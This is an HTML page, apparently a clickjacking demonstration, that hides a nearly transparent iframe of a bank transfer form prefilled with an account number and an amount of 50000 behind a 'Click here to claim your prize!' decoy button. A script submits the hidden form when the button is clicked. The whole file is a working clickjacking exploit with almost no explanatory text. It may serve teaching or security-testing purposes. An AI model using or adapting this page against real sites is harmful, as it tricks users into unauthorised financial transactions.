<!DOCTYPE html>
<html>
<head>
    <title>Free Prize!</title>
    <style>
        #wrapper {
            position: relative;
            width: 350px;
            height: 220px;
        }

        #decoy {
            position: absolute;
            top: 0;
            left: 0;
            width: 350px;
            height: 220px;
            background: yellow;
            text-align: center;
            padding-top: 80px;
            font-size: 18px;
            cursor: pointer;
            z-index: 2;
            box-sizing: border-box;
        }

        /* iframe is hidden behind decoy */
        #victim-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 350px;
            height: 220px;
            opacity: 0.00001;
            z-index: 1;
            border: none;
        }
    </style>
</head>
<body>

<h2>Attacker Page</h2>
<p>User sees yellow button. Victim form is loaded in hidden iframe behind it.</p>

<div id="wrapper">

    <!-- victim.html loaded in hidden iframe with prefilled data -->
    <iframe
        id="victim-frame"
        name="victim-frame"
        src="victim.html?name=Mohammed&account=9876543210&amount=50000">
    </iframe>

    <!-- decoy button on top -->
    <div id="decoy" onclick="submitVictimForm()">
        Click here to claim your prize!
    </div>

</div>

<br>
<div id="msg" style="color:red; font-weight:bold;"></div>

<script>
    function submitVictimForm() {
        // Access the form inside the iframe and submit it
        var iframe = document.getElementById('victim-frame');
        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        var form = iframeDoc.querySelector('form');
        form.submit();
        document.getElementById('msg').innerHTML = "Clicked! Bank form submitted silently.";
    }
</script>

</body>
</html>
